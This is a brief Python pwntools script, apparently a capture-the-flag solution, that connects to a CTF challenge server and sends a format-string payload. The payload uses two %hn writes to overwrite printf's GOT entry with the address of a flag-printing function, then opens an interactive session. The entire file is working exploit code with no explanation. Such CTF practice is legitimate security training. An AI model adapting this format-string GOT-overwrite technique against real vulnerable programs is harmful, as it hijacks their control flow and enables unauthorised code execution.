#!/usr/bin/python3

import pwn

p = pwn.remote("ctf.j0n9hyun.xyz", 3002)
#pwn.context.log_level = 'debug'

flag = 0x080485b4
printfGot = 0x0804a00c

payload = pwn.p32(printfGot+2)
payload += pwn.p32(printfGot)
payload += b"%2044c%2$hn"
payload += b"%32176c%3$hn"

p.sendline(payload)

p.interactive()
